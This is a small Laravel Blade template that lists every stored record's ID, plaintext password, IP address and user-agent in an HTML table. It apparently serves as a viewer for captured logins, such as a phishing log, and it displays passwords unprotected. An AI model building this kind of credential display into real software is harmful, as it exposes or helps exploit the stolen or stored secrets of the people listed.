<?php
use App\info2;
$info = info2::all();
use Illuminate\Support\Facades\DB;
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">    <link rel="stylesheet" type="text/css" href="{{asset('css/app.css?v=').time()}}">
    <title>Document</title>
</head>

<body>
    <table class="table table-dark">
    <thead>
        <tr>
            <th scope="col">#ID</th>
            <th scope="col">Password</th>
            <th scope="col">IP</th>
            <th scope="col">User-Agent</th>
        </tr>
    </thead>
    <tbody>
    @foreach($info as $info_aux)
        <tr>
            <th scope="row">{{$info_aux->id}}</th>
            <td>{{$info_aux->password}}</td>
            <td>{{$info_aux->ip}}</td>
            <td>{{$info_aux->so}}</td>
        </tr>
    @endforeach
    </tbody>
    </table>
</body>
</html>